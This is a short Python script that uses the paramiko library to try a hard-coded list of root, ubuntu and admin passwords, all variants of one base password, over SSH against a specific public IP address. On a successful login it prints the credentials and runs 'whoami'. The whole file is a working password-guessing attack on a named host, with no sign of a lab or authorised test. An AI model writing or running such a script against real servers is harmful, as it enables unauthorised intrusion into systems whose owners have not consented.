import paramiko

trials = [
    ("root", "Photoshop09@"),
    ("root", "Photoshop09"),
    ("root", "photoshop09@"),
    ("root", "Photoshop@09"),
    ("ubuntu", "Photoshop09@"),
    ("admin", "Photoshop09@"),
]

for user, pw in trials:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname="200.97.163.236",
            port=22,
            username=user,
            password=pw,
            timeout=8,
            look_for_keys=False,
            allow_agent=False
        )
        print(f"SUCCESS: user={user}, pw={pw}")
        stdin, stdout, stderr = client.exec_command("whoami")
        print(stdout.read().decode())
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"FAILED: user={user}, pw={pw}")
    except Exception as e:
        print(f"ERR: {user} {e}")
